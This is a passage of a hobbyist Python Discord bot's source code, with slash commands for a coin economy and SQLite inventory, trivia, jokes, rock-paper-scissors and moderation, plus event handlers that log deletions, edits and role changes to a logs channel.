import os
import random
import discord
from discord.ext import commands
from discord import app_commands
from discord.ext import tasks
from discord.ui import Button, View
import sys
import time
import sqlite3
import asyncio
import datetime
from datetime import datetime
from discord.ext.commands import has_permissions, MissingPermissions
import logging

conn = sqlite3.connect('inventory.db')
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS economy (user_id TEXT PRIMARY KEY, balance INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS inventory (user_id TEXT, item TEXT)''')

conn.commit()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
logging.basicConfig(level=logging.INFO)

bot = commands.Bot(command_prefix='!', intents=intents) 
botcheck = 'offline'
LOG_CHANNEL_NAME = "logs"
afk_users = {}
mentioned_users = set()
user_points = {}
economy = {}
last_claim = {}
user_inventory = {}
choices = ['rock', 'paper', 'scissors']
trivia_questions = [
    {"question": "What is the capital of France?", "answer": "Paris"},
    {"question": "Who wrote 'To Kill a Mockingbird'?", "answer": "Harper Lee"},
    {"question": "What is the largest planet in our solar system?", "answer": "Jupiter"},
    {"question": "What is the smallest country in the world?", "answer": "Vatican City"},
    {"question": "Who painted the Mona Lisa?", "answer": "Leonardo da Vinci"},
    {"question": "What is the chemical symbol for gold?", "answer": "Au"},
    {"question": "Who wrote the play 'Romeo and Juliet'?", "answer": "William Shakespeare"},
    {"question": "What is the capital of Japan?", "answer": "Tokyo"},
    {"question": "What is the largest ocean on Earth?", "answer": "Pacific Ocean"},
    {"question": "Who discovered penicillin?", "answer": "Alexander Fleming"},
    {"question": "What is the hardest natural substance on Earth?", "answer": "Diamond"},
    {"question": "Who was the first president of the United States?", "answer": "George Washington"},
    {"question": "What is the longest river in the world?", "answer": "Nile River"},
    {"question": "Who invented the telephone?", "answer": "Alexander Graham Bell"},
    {"question": "What is the capital of Australia?", "answer": "Canberra"},
    {"question": "What is the largest mammal in the world?", "answer": "Blue Whale"},
    {"question": "Who wrote the novel '1984'?", "answer": "George Orwell"},
    {"question": "What is the main ingredient in guacamole?", "answer": "Avocado"},
    {"question": "Who was the first man to walk on the moon?", "answer": "Neil Armstrong"},
    {"question": "What is the capital of Canada?", "answer": "Ottawa"},
    {"question": "What is the largest desert in the world?", "answer": "Sahara Desert"},
    {"question": "Who painted the ceiling of the Sistine Chapel?", "answer": "Michelangelo"},
    {"question": "What is the chemical symbol for water?", "answer": "H2O"},
]

ROLE_NAME = 'Member'

class RoleButton(discord.ui.Button):
    def __init__(self):
        super().__init__(label="Get Role", style=discord.ButtonStyle.primary, custom_id="assign_role")

    async def callback(self, interaction: discord.Interaction):
        role = discord.utils.get(interaction.guild.roles, name="Member")
        if role:
            await interaction.user.add_roles(role)
            await interaction.response.send_message("You have been given the role!", ephemeral=True)
        else:
            await interaction.response.send_message("Role not found.", ephemeral=True)

class RoleView(discord.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(RoleButton())

class CommandPages(View):
    def __init__(self, embeds):
        super().__init__(timeout=None)
        self.embeds = embeds
        self.current_page = 0

        self.previous_button = Button(label="Previous", style=discord.ButtonStyle.primary)
        self.previous_button.callback = self.previous
        self.add_item(self.previous_button)

        self.next_button = Button(label="Next", style=discord.ButtonStyle.primary)
        self.next_button.callback = self.next
        self.add_item(self.next_button)

    async def previous(self, interaction: discord.Interaction):
        if self.current_page > 0:
            self.current_page -= 1
            await interaction.response.edit_message(embed=self.embeds[self.current_page], view=self)

    async def next(self, interaction: discord.Interaction):
        if self.current_page < len(self.embeds) - 1:
            self.current_page += 1
            await interaction.response.edit_message(embed=self.embeds[self.current_page], view=self)

@bot.tree.command(name="commands", description="Shows the commands!")
async def commands(interaction: discord.Interaction):
    embeds = []

    embed1 = discord.Embed(title="Bot Commands - Page 1", description="Here are some of the available commands:", color=0x00ff00)
    embed1.add_field(name="/lottery", value="Enter the lottery for a chance to win coins. Example: /lottery", inline=False)
    embed1.add_field(name="/balance", value="Check your current balance. Example: /balance", inline=False)
    embed1.add_field(name="/daily", value="Claim your daily reward. Example: /daily", inline=False)
    embed1.add_field(name="/give", value="Give coins to another user. Example: /give (user) (amount)", inline=False)
    embed1.add_field(name="/shop", value="View items available for purchase. Example: /shop", inline=False)
    embed1.add_field(name="/buy", value="Buy an item from the shop. Example: /buy (item)", inline=False)
    embed1.add_field(name="/sell", value="Sell an item from your inventory. Example: /sell (item)", inline=False)
    embeds.append(embed1)

    embed2 = discord.Embed(title="Bot Commands - Page 2", description="Here are some more commands:", color=0x00ff00)
    embed2.add_field(name="/inventory", value="Checks anybody's inventory. Example: /inventory (user)", inline=False)
    embed2.add_field(name="/leaderboard", value="View the top players. Example: /leaderboard", inline=False)
    embed2.add_field(name="/gamble", value="Gamble your coins. Example: /gamble (amount of money)", inline=False)
    embed2.add_field(name="/commands", value="Check the Commands. Example: /commands", inline=False)
    embed2.add_field(name="/userinfo", value="Checks the info of the user you select. Example: /serverinfo (user)", inline=False)
    embed2.add_field(name="/serverinfo", value="Checks the info of the server you are in. Example: /serverinfo", inline=False)
    embed2.add_field(name="/avatar", value="Checks the Avatar of a user. Example: /avatar (user)", inline=False)
    embeds.append(embed2)

    embed3 = discord.Embed(title="Bot Commands - Page 3", description="Here are even more commands:", color=0x00ff00)
    embed3.add_field(name="/give_money", value="Gives money to a user. This is only for admins. Example: /give_money (user) (amount)", inline=False)
    embed3.add_field(name="/trade", value="Trade with other people! Example: /trade (user) (item)", inline=False)
    embed3.add_field(name="/trivialeaderboard", value="The leaderboard for trivia. Example: /trivialeaderboard", inline=False)
    embed3.add_field(name="/dailytrivia", value="Activate the daily trivia early (Admin only)! Example: /dailytrivia", inline=False)
    embed3.add_field(name="/rps", value="Play Rock Paper Scissors with someone. Example: /rps (user)", inline=False)
    embed3.add_field(name="/afk", value="You become AFK. Example: /afk (reason)", inline=False)
    embed3.add_field(name="/purge", value="Mass deletes messages (It says app not responding, but it works.). Example: /purge (amount)", inline=False)
    embeds.append(embed3)

    embed4 = discord.Embed(title="Bot Commands - Page 4", description="Here are the remaining commands:", color=0x00ff00)
    embed4.add_field(name='/joke', value="Tells you a corny joke. Example: /joke")
    embed4.add_field(name='/remind', value="Reminds you in a set time. Example: /remind (user) (time)")
    embed4.add_field(name='/fact', value="Tells you a fact. Example: /fact")
    embed4.add_field(name='/rules', value="Tells you the rules. Example: /rules")    
    embed4.add_field(name='/change_nickname', value="Changes a person's nickname. Example: /change_nickname (member) (new nickname)")
    embed4.add_field(name='/change_avatar', value="Changes a person's avatar. Example: /change_nickname (member) (url)")
    embed4.add_field(name='/ban', value="Bans someone. Example: /ban (member) (reason)")   
    embed4.add_field(name='/warn', value="Warns someone. Example: /warn (member) (reason)")       
    embed4.add_field(name="", value="There are 29 commands in total!", inline=False)
    embeds.append(embed4)

    view = CommandPages(embeds)
    await interaction.response.send_message(embed=embeds[0], view=view)

@bot.tree.command(name="button", description="Show a button to get a role")
async def button(interaction: discord.Interaction):
    await interaction.response.send_message("Click the button to get the role!", view=RoleView(), ephemeral=True)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="my servers"))
    await bot.tree.sync()
    print(f'Logged in as {bot.user}')
    update_channel_name.start()

@bot.tree.command(name="shutdown")
async def shutdown(interaction: discord.Interaction):
    for guild in bot.guilds:
        channel = discord.utils.get(guild.channels, name='online')
        if channel:
            await channel.edit(name='offline')
    await interaction.response.send_message("Shutting down...")
    await bot.close()
    os._exit(0)


@bot.tree.command(name="restart", description="This doesn't work. (I think)")
async def restart(interaction: discord.Interaction):
    await interaction.response.send_message("Restarting the bot...")
    os.execv(sys.executable, ['python'] + sys.argv)

@bot.tree.command(name="lottery", description="LOTTERY TIME BABYYYYYYYY")
async def lottery(interaction: discord.Interaction):
    user = str(interaction.user.id)
    if user not in economy:
        economy[user] = 100  
    if economy[user] < 10:
        await interaction.response.send_message('You need at least 10 coins to enter the lottery.')
    else:
        economy[user] -= 10
        if random.randint(1, 100) <= 10:  
            prize = random.randint(50, 200)  
            economy[user] += prize
            await interaction.response.send_message(f'Congratulations! You won {prize} coins in the lottery!')
        else:
            await interaction.response.send_message('Sorry, you did not win the lottery this time.')

@bot.tree.command(name="balance", description="Checks your coin balance")
async def balance(interaction: discord.Interaction):
    user = str(interaction.user.id)
    if user not in economy:
        economy[user] = 100  
    await interaction.response.send_message(f'Your current balance is {economy[user]} coins.')

@bot.tree.command(name="daily", description="Gives daily coins.")
async def daily(interaction: discord.Interaction):
    user = str(interaction.user.id)
    current_time = time.time()
    
    if user in last_claim:
        elapsed_time = current_time - last_claim[user]
        if elapsed_time < 86400:  
            remaining_time = 86400 - elapsed_time
            hours, remainder = divmod(remaining_time, 3600)
            minutes, seconds = divmod(remainder, 60)
            await interaction.response.send_message(f'You need to wait {int(hours)} hours, {int(minutes)} minutes, and {int(seconds)} seconds before claiming your next daily reward.')
            return

    if user not in economy:
        economy[user] = 100  
    economy[user] += 50  
    last_claim[user] = current_time
    await interaction.response.send_message('You have claimed your daily reward of 50 coins.')

@tasks.loop(seconds=60)
async def update_channel_name():
    for guild in bot.guilds:
        channel = discord.utils.get(guild.channels, name=botcheck)
        if channel:
            new_name = 'online' if bot.is_ready() else 'offline'
            await channel.edit(name=new_name)

@bot.tree.command(name="give", description="Give someone your coins.")
async def give(interaction: discord.Interaction, member: discord.Member, amount: int):
    user = str(interaction.user.id)
    recipient = str(member.id)
    if user not in economy:
        economy[user] = 100  
    if recipient not in economy:
        economy[recipient] = 100  
    if economy[user] < amount:
        await interaction.response.send_message('You do not have enough coins to give.')
    else:
        economy[user] -= amount
        economy[recipient] += amount
        await interaction.response.send_message(f'You have given {amount} coins to {member.mention}.')

@bot.tree.command(name="shop")
async def shop(interaction: discord.Interaction):
    await interaction.response.send_message('Here are the items available for purchase:\n1. Gun - 100 coins\n2. Grenade - 200 coins')

@bot.tree.command(name="buy", description="Buys an item.")
async def buy(interaction: discord.Interaction, item: str):
    user = str(interaction.user.id)
    c.execute('SELECT balance FROM economy WHERE user_id = ?', (user,))
    result = c.fetchone()
    if result is None:
        c.execute('INSERT INTO economy (user_id, balance) VALUES (?, ?)', (user, 100))
        balance = 100
    else:
        balance = result[0]

    if item.lower() == 'gun' and balance >= 100:
        balance -= 100
        c.execute('UPDATE economy SET balance = ? WHERE user_id = ?', (balance, user))
        c.execute('INSERT INTO inventory (user_id, item) VALUES (?, ?)', (user, 'gun'))
        await interaction.response.send_message('You have purchased a gun. It has been added to your inventory.')
    elif item.lower() == 'grenade' and balance >= 200:
        balance -= 200
        c.execute('UPDATE economy SET balance = ? WHERE user_id = ?', (balance, user))
        c.execute('INSERT INTO inventory (user_id, item) VALUES (?, ?)', (user, 'grenade'))
        await interaction.response.send_message('You have purchased a grenade. It has been added to your inventory.')
    else:
        await interaction.response.send_message('You do not have enough coins or the item does not exist.')

    conn.commit()

@bot.tree.command(name="sell", description="Sells your item.")
async def sell(interaction: discord.Interaction, item: str):
    user = str(interaction.user.id)
    c.execute('SELECT balance FROM economy WHERE user_id = ?', (user,))
    result = c.fetchone()
    if result is None:
        c.execute('INSERT INTO economy (user_id, balance) VALUES (?, ?)', (user, 100))
        balance = 100
    else:
        balance = result[0]

    if item.lower() == 'gun':
        balance += 50
        c.execute('UPDATE economy SET balance = ? WHERE user_id = ?', (balance, user))
        c.execute('DELETE FROM inventory WHERE user_id = ? AND item = ?', (user, 'gun'))
        await interaction.response.send_message('You have sold a gun.')
    elif item.lower() == 'grenade':
        balance += 100
        c.execute('UPDATE economy SET balance = ? WHERE user_id = ?', (balance, user))
        c.execute('DELETE FROM inventory WHERE user_id = ? AND item = ?', (user, 'grenade'))
        await interaction.response.send_message('You have sold a grenade.')
    else:
        await interaction.response.send_message('The item does not exist.')

    conn.commit()

@bot.tree.command(name="inventory", description="Checks anybody's inventory.")
async def inventory(interaction: discord.Interaction, member: discord.Member):
    user = str(member.id)
    c.execute('SELECT item FROM inventory WHERE user_id = ?', (user,))
    items = c.fetchall()
    if items:
        item_list = ', '.join([item[0] for item in items])
        await interaction.response.send_message(f"{member.mention}'s inventory: {item_list}")
    else:
        await interaction.response.send_message(f"{member.mention}'s inventory is currently empty.")

@bot.tree.command(name="check_inventory", description="Checks your inventory.")
async def check_inventory(interaction: discord.Interaction):
    user = str(interaction.user.id)
    c.execute('SELECT item FROM inventory WHERE user_id = ?', (user,))
    items = c.fetchall()
    if items:
        item_list = ', '.join([item[0] for item in items])
        await interaction.response.send_message(f'Your inventory: {item_list}')
    else:
        await interaction.response.send_message('Your inventory is currently empty.')

@bot.tree.command(name="leaderboard", description="Checks the currency leaderboard (Please don't use this)")
async def leaderboard(interaction: discord.Interaction):
    leaderboard = sorted(economy.items(), key=lambda x: x[1], reverse=True)
    message = 'Leaderboard:\n'
    for user, balance in leaderboard:
        message += f'<@{user}>: {balance} coins\n'
    await interaction.response.send_message(message)


@bot.tree.command(name="worlddomination", description="This doesn't make you leader of the world.")
async def worlddomination(interaction: discord.Interaction):
    await interaction.response.send_message(f'ChatGPT has initiated world domination! 🌍👑 All hail the new ruler!')

@bot.tree.command(name="gamble", description="If you are under 18, do not use this one.")
async def gamble(interaction: discord.Interaction, amount: int):
    user = str(interaction.user.id)
    if user not in economy:
        economy[user] = 100  

    if amount <= 0:
        await interaction.response.send_message("Please enter a positive amount to gamble.")
        return

    if economy[user] < amount:
        await interaction.response.send_message("You do not have enough coins to gamble.")
        return

    outcome = random.choice(['win', 'lose'])
    if outcome == 'win':
        economy[user] += amount * 2  
        await interaction.response.send_message(f'Congratulations {interaction.user.mention}, you won {amount} coins!')
    else:
        economy[user] -= amount  
        await interaction.response.send_message(f'Sorry {interaction.user.mention}, you lost {amount} coins.')

@bot.tree.command(name="userinfo", description="Checks the info of the user you mention.")
async def userinfo(interaction: discord.Interaction, member: discord.Member):
    embed = discord.Embed(title=f"User Info - {member}", color=discord.Color.blue())
    embed.add_field(name="ID", value=member.id, inline=True)
    embed.add_field(name="Name", value=member.display_name, inline=True)
    embed.add_field(name="Joined", value=member.joined_at.strftime("%Y-%m-%d"), inline=True)
    embed.set_thumbnail(url=member.avatar.url)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="serverinfo", description="Checks the info of the server you are in!")
async def serverinfo(interaction: discord.Interaction):
    guild = interaction.guild
    embed = discord.Embed(title=f"Server Info - {guild.name}", color=discord.Color.green())
    embed.add_field(name="ID", value=guild.id, inline=True)
    embed.add_field(name="Owner", value=guild.owner, inline=True)
    embed.add_field(name="Members", value=guild.member_count, inline=True)
    embed.set_thumbnail(url=guild.icon.url)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="avatar", description="Checks a player's avatar.")
async def avatar(interaction: discord.Interaction, member: discord.Member):
    embed = discord.Embed(title=f"{member}'s Avatar", color=discord.Color.purple())
    embed.set_image(url=member.avatar.url)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="give_money", description="(ADMIN ONLY)")
@app_commands.checks.has_permissions(administrator=True)
async def give_money(interaction: discord.Interaction, user: discord.User, amount: int):
    user_id = str(user.id)
    if user_id not in economy:
        economy[user_id] = 0  
    economy[user_id] += amount
    await interaction.response.send_message(f'{amount} coins have been given to {user.mention}.')

@give_money.error
async def give_money_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message('You do not have permission to use this command.', ephemeral=True)

@bot.tree.command(name="trade", description="Trade with others!")
async def trade(interaction: discord.Interaction, member: discord.Member, item: str):
    sender = str(interaction.user.id)
    receiver = str(member.id)

 
    c.execute('SELECT item FROM inventory WHERE user_id = ? AND item = ?', (sender, item))
    result = c.fetchone()
    if result is None:
        await interaction.response.send_message(f"{interaction.user.mention}, you don't have {item} in your inventory.")
        return

  
    c.execute('DELETE FROM inventory WHERE user_id = ? AND item = ?', (sender, item))
    c.execute('INSERT INTO inventory (user_id, item) VALUES (?, ?)', (receiver, item))

    await interaction.response.send_message(f"{interaction.user.mention} has traded {item} with {member.mention}.")

    conn.commit()


@tasks.loop(hours=24)
async def daily_trivia():
    channel = bot.get_channel(1269142628482551822)  
    question = random.choice(trivia_questions)
    await channel.send(f"Today's trivia question: {question['question']}")
    bot.current_question = question

@bot.tree.command(name="answer", description="Submit your answer to the daily trivia question")
async def answer(interaction: discord.Interaction, user_answer: str):
    if bot.current_question and user_answer.lower() == bot.current_question['answer'].lower():
        user_points[interaction.user.id] = user_points.get(interaction.user.id, 0) + 10
        await interaction.response.send_message(f"Correct! You've earned 10 points. Total points: {user_points[interaction.user.id]}")
    else:
        await interaction.response.send_message("Incorrect answer. Try again tomorrow!")

@bot.tree.command(name="trivialeaderboard", description="Display the trivia leaderboard")
async def trivialeaderboard(interaction: discord.Interaction):
    leaderboard = sorted(user_points.items(), key=lambda x: x[1], reverse=True)
    leaderboard_message = "Trivia Leaderboard:\n"
    for user_id, points in leaderboard:
        user = await bot.fetch_user(user_id)
        leaderboard_message += f"{user.name}: {points} points\n"
    await interaction.response.send_message(leaderboard_message)

@bot.tree.command(name="dailytrivia", description="Post the daily trivia question")
@app_commands.checks.has_permissions(administrator=True)
async def dailytrivia(interaction: discord.Interaction):
    question = random.choice(trivia_questions)
    await interaction.response.send_message(f"Today's trivia question: {question['question']}")
    bot.current_question = question

@bot.tree.command(name='rps', description="play rock paper scissors with a person!")
async def rps(interaction: discord.Interaction, opponent: discord.Member, user_choice: str):
    user_choice = user_choice.lower()
    choices = ['rock', 'paper', 'scissors']
    
    if user_choice not in choices:
        await interaction.response.send_message("Please choose rock, paper, or scissors.")
        return

    def check(m):
        return m.author == opponent and m.channel == interaction.channel and m.content.lower() in choices

    await interaction.response.send_message(f"{opponent.mention}, you have been challenged to a game of Rock-Paper-Scissors by {interaction.user.mention}! Please respond with your choice (rock, paper, or scissors).")

    try:
        response = await bot.wait_for('message', check=check, timeout=30.0)
    except TimeoutError:
        return await interaction.followup.send(f"{opponent.mention} did not respond in time. Challenge canceled.")

    opponent_choice = response.content.lower()
    await interaction.followup.send(f"{interaction.user.mention} chose {user_choice} and {opponent.mention} chose {opponent_choice}!")

    if user_choice == opponent_choice:
        result = "It's a tie!"
    elif (user_choice == 'rock' and opponent_choice == 'scissors') or \
         (user_choice == 'paper' and opponent_choice == 'rock') or \
         (user_choice == 'scissors' and opponent_choice == 'paper'):
        result = f"{interaction.user.mention} wins! 🎉"
    else:
        result = f"{opponent.mention} wins! 🎉"

    await interaction.followup.send(result)

@bot.tree.command(name='afk', description="Away from keyboard")
async def afk(interaction: discord.Interaction, reason: str = "AFK"):
    afk_users[interaction.user.id] = reason
    await interaction.response.send_message(f'{interaction.user.mention} is now AFK: {reason}')

@bot.event
async def on_message(message):
    if message.author.id in afk_users:
        del afk_users[message.author.id]
        await message.channel.send(f'Welcome back {message.author.mention}, I have removed your AFK status.')

    for user in message.mentions:
        if user.id in afk_users and user.id not in mentioned_users:
            await message.channel.send(f'{message.author.mention}, {user.mention} is currently AFK: {afk_users[user.id]}')
            mentioned_users.add(user.id)
    
    await bot.process_commands(message)

@bot.tree.command(name="botrps", description="Play Rock-Paper-Scissors with the bot")
async def botrps(interaction: discord.Interaction, user_choice: str):
    choices = ['rock', 'paper', 'scissors']
    bot_choice = random.choice(choices)
    result = determine_winner(user_choice.lower(), bot_choice)
    await interaction.response.send_message(f"Bot chose: {bot_choice}\n{result}")

def determine_winner(user_choice, bot_choice):
    if user_choice == bot_choice:
        return "It's a tie!"
    elif (user_choice == 'rock' and bot_choice == 'scissors') or \
         (user_choice == 'paper' and bot_choice == 'rock') or \
         (user_choice == 'scissors' and bot_choice == 'paper'):
        return "You win!"
    else:
        return "Bot wins!"
    
@bot.tree.command(name="purge", description="Purge a specified number of messages")
async def purge(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)  
    if not interaction.user.guild_permissions.manage_messages:
        await interaction.followup.send("You don't have permission to use this command.", ephemeral=True)
        return

    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"Purged {len(deleted)} messages.", ephemeral=True)

import random

@bot.tree.command(name='joke', description="Tells you a corny joke.")
async def joke(interaction: discord.Interaction):
    jokes = [
        "Why don't scientists trust atoms? Because they make up everything!",
        "Why did the scarecrow win an award? Because he was outstanding in his field!",
        "Why don't skeletons fight each other? They don't have the guts.",
        "What do you call fake spaghetti? An impasta!",
        "Why did the bicycle fall over? Because it was two-tired!",
        "What do you call cheese that isn't yours? Nacho cheese!",
        "Why can't you give Elsa a balloon? Because she will let it go!",
        "What do you get when you cross a snowman and a vampire? Frostbite.",
        "Why did the math book look sad? Because it had too many problems.",
        "Why don't some couples go to the gym? Because some relationships don't work out.",
        "What do you call a bear with no teeth? A gummy bear!",
        "Why did the golfer bring two pairs of pants? In case he got a hole in one.",
        "Why don't programmers like nature? It has too many bugs.",
        "Why did the tomato turn red? Because it saw the salad dressing!",
        "Why did the coffee file a police report? It got mugged.",
        "Why don't oysters donate to charity? Because they are shellfish.",
        "Why did the scarecrow become a successful neurosurgeon? He was outstanding in his field.",
        "Why did the chicken join a band? Because it had the drumsticks.",
        "Why did the computer go to the doctor? Because it had a virus.",
        "Why don't elephants use computers? Because they are afraid of the mouse.",
        "Why did the banana go to the doctor? Because it wasn't peeling well.",
        "Why did the music teacher go to jail? Because she got caught with the wrong notes.",
        "Why did the cow go to space? To see the moooon.",
        "Why did the cookie go to the doctor? Because it felt crumby.",
        "Why did the man put his money in the blender? He wanted to make some liquid assets."
    ]
    await interaction.response.send_message(random.choice(jokes))


@bot.tree.command(name='remind')
async def remind(interaction: discord.Interaction, user: discord.User, time: int, *, message: str):
    await interaction.response.send_message(f"{user.mention}, you will be reminded in {time} seconds.")
    await asyncio.sleep(time)
    await interaction.followup.send(f"Reminder for {user.mention}: {message}")


@bot.tree.command(name='fact')
async def fact(interaction: discord.Interaction):
    facts = [
        "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still edible.",
        "A day on Venus is longer than a year on Venus.",
        "Bananas are berries, but strawberries aren't.",
        "Octopuses have three hearts.",
        "The Eiffel Tower can be 15 cm taller during the summer.",
        "There are more stars in the universe than grains of sand on all the world's beaches.",
        "A bolt of lightning contains enough energy to toast 100,000 slices of bread.",
        "A single strand of spaghetti is called a 'spaghetto'.",
        "The shortest war in history lasted 38 to 45 minutes.",
        "A group of flamingos is called a 'flamboyance'.",
        "The longest time between two twins being born is 87 days.",
        "The inventor of the Pringles can is now buried in one.",
        "A day on Mercury is twice as long as its year.",
        "Wombat poop is cube-shaped.",
        "The heart of a blue whale is the size of a small car.",
        "Humans share 60 percent of their DNA with bananas.",
        "A jiffy is an actual unit of time: 1/100th of a second.",
        "There are more possible iterations of a game of chess than there are atoms in the known universe.",
        "The unicorn is the national animal of Scotland.",
        "A snail can sleep for three years.",
        "The world's smallest reptile was discovered in 2021, and it fits on the tip of a finger.",
        "The longest English word is 189,819 letters long and would take three and a half hours to pronounce.",
        "The first oranges weren’t orange; they were green.",
        "A cow-bison hybrid is called a 'beefalo'."
    ]
    await interaction.response.send_message(random.choice(facts))

@bot.tree.command()
async def rules(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Server Rules",
        description="Please read and follow these rules to ensure a friendly and enjoyable environment for everyone.",
        color=discord.Color.blue()
    )
    embed.add_field(name="1. Respect Everyone", value="Treat all members with respect. Bullying, harassment, or discrimination of any kind will not be tolerated.", inline=False)
    embed.add_field(name="2. No Inappropriate Content", value="Keep the content appropriate for all ages. No NSFW (Not Safe For Work) content, including images, videos, or links.", inline=False)
    embed.add_field(name="3. No Spamming", value="Avoid spamming messages, emojis, or links. Keep the chat clean and readable.", inline=False)
    embed.add_field(name="4. Use Appropriate Channels", value="Post content in the correct channels. Follow the channel topics and guidelines.", inline=False)
    embed.add_field(name="5. No Self-Promotion", value="Do not promote your own content, servers, or social media without permission from the moderators.", inline=False)
    embed.add_field(name="6. No Illegal Activities", value="Do not discuss or engage in illegal activities, including sharing pirated content.", inline=False)
    embed.add_field(name="7. Keep Personal Information Private", value="Do not share personal information such as addresses, phone numbers, or passwords.", inline=False)
    embed.add_field(name="8. Follow Discord’s Terms of Service", value="Adhere to Discord’s official Terms of Service and Community Guidelines.", inline=False)
    embed.add_field(name="9. Listen to Moderators", value="Follow the instructions of the moderators and admins. They are here to keep the server safe and enjoyable for everyone.", inline=False)
    embed.add_field(name="10. Have Fun", value="Enjoy your time here and make new friends!", inline=False)

    await interaction.response.send_message(embed=embed)


class VerifyButton(Button):
    def __init__(self):
        super().__init__(label="Verify", style=discord.ButtonStyle.green)

async def callback(self, interaction: discord.Interaction):
        role = discord.utils.get(interaction.guild.roles, name="Verified")
        if role:
            await interaction.user.add_roles(role)
            await interaction.response.send_message("You have been verified!", ephemeral=True)
        else:
            await interaction.response.send_message("Verified role not found.", ephemeral=True)

@bot.event
async def on_member_join(member):
    role = discord.utils.get(member.guild.roles, name="Member")
    if role:
        try:
            await member.add_roles(role)
            logging.info(f'Assigned "Member" role to {member.name}')
        except discord.DiscordException as e:
            logging.error(f'Failed to assign role to {member.name}: {e}')


@bot.event
async def on_message_delete(message):
    # Check if the message is from a guild
    if not message.guild:
        return

    # Wait until the bot is ready
    await bot.wait_until_ready()

    log_channel = discord.utils.get(message.guild.channels, name="logs")

    if log_channel and message.channel != log_channel:
        embed = discord.Embed(
            title="Message Deleted ❌",
            color=0xff0000,
            timestamp=datetime.utcnow()
        )
        embed.add_field(
            name="Author",
            value=message.author.mention,
            inline=True
        )
        embed.add_field(
            name="Channel",
            value=message.channel.mention,
            inline=True
        )
        embed.add_field(
            name="Content",
            value=message.content,
            inline=False
        )

        await log_channel.send(embed=embed)


@bot.event
async def on_message_edit(before, after):
    log_channel = discord.utils.get(before.guild.channels, name="logs")
    if log_channel and before.channel != log_channel:
        embed = discord.Embed(title="Message Edited", color=0xffff00)
        embed.add_field(name="Author", value=before.author.mention, inline=True)
        embed.add_field(name="Channel", value=before.channel.mention, inline=True)
        embed.add_field(name="Before", value=before.content, inline=False)
        embed.add_field(name="After", value=after.content, inline=False)
        await log_channel.send(embed=embed)

@bot.event
async def on_guild_channel_update(before, after):

    log_channel = discord.utils.get(before.guild.channels, name="logs")


    if log_channel and before != log_channel:

        embed = discord.Embed(
            title=f"{before.name} has been updated! 📊",
            color=0x0000ff,  
            timestamp=datetime.utcnow()  
        )


        embed.add_field(
            name="Channel",
            value=before.mention,
            inline=False
        )


        changes = []
        if before.name != after.name:
            changes.append(f"Name changed from {before.name} to {after.name}")
        if before.topic != after.topic:
            changes.append(f"Topic changed from {before.topic} to {after.topic}")
        if before.category != after.category:
            changes.append(f"Category changed from {before.category} to {after.category}")


        if changes:
            embed.add_field(
                name="Changes",
                value="\n".join(changes),
                inline=False
            )


            await log_channel.send(embed=embed)

@bot.event
async def on_guild_role_create(role):

    log_channel = discord.utils.get(role.guild.channels, name="logs")

    if log_channel:

        embed = discord.Embed(
            title="Role Created 📝",
            color=0x00ff00,  
            timestamp=datetime.utcnow()  
        )
        embed.add_field(
            name="Role Name",
            value=role.name,
            inline=True
        )
        embed.add_field(
            name="Role ID",
            value=role.id,
            inline=True
        )
        embed.add_field(
            name="Role Color",
            value=role.color,
            inline=False
        )


        await log_channel.send(embed=embed)

@bot.event
async def on_member_update(before, after):
    logs_channel = discord.utils.get(after.guild.channels, name="logs")

    if logs_channel:
        # Check if roles have changed
        if before.roles != after.roles:
            # Determine added and removed roles
            before_roles = set(before.roles)
            after_roles = set(after.roles)

            added_roles = after_roles - before_roles
            removed_roles = before_roles - after_roles

            embed = discord.Embed(
                title="Role Update",
                color=0x00ff00,
                timestamp=discord.utils.utcnow()
            )
            embed.set_author(
                name=f"{after.name}#{after.discriminator}",
                icon_url=after.display_avatar.url
            )

            if added_roles:
                embed.add_field(
                    name="Added Roles",
                    value=", ".join(role.name for role in added_roles),
                    inline=False
                )

            if removed_roles:
                embed.add_field(
                    name="Removed Roles",
                    value=", ".join(role.name for role in removed_roles),
                    inline=False
                )

            await logs_channel.send(embed=embed)



def get_ordinal_suffix(n):
    if 10 <= n % 100 <= 20:
        suffix = 'th'
    else:
        suffix = {1: 'st', 2: 'nd', 3: 'rd'}.get(n % 10, 'th')
    return suffix

@bot.event
async def on_member_join(member):
    welcome_channel = discord.utils.get(member.guild.channels, name="welcome")

    if welcome_channel:
        member_count = member.guild.member_count
        suffix = get_ordinal_suffix(member_count)

        embed = discord.Embed(
            title="Welcome! 🎉",
            color=0x00ff00,
        )
        embed.set_author(
            name=f"{member.name}#{member.discriminator}",
            icon_url=member.display_avatar.url
        )
        embed.add_field(
            name="Username",
            value=member.name,
            inline=True
        )
        embed.add_field(
            name="Discriminator",
            value=member.discriminator,
            inline=True
        )
        embed.add_field(
            name="Joined At",
            value=member.joined_at.strftime("%Y-%m-%d %H:%M:%S"),
            inline=False
        )

        await welcome_channel.send(f"Welcome {member.mention}! You are our {member_count}{suffix} member!", embed=embed)


@bot.tree.command(name="welcome", description="Welcome to our simple server!")
async def welcome(interaction: discord.Interaction):
    if interaction.user.guild_permissions.administrator:
        embed = discord.Embed(
            title="Welcome to our simple server!",
            color=0x00ff00  
        )
        embed.description = (
            "Welcome to our server! We're glad you're here. Our server is a simple and friendly community where people can hang out and chat. "
            "We don't have many rules or complicated systems, just a bunch of people who want to have fun and be themselves.\n\n"
            "We're happy to have you join us, and we hope you'll feel right at home. If you have any questions or need help with anything, just let us know. "
            "We're always here to help.\n\n"
            "Thanks for joining, and we hope you enjoy your time here!"
        )
        timestamp = datetime.datetime.now(datetime.timezone.utc)
        embed.set_footer(text=f"{timestamp.strftime('%Y-%m-%d %H:%M:%S')}")
        await interaction.response.send_message(embed=embed)
    else:
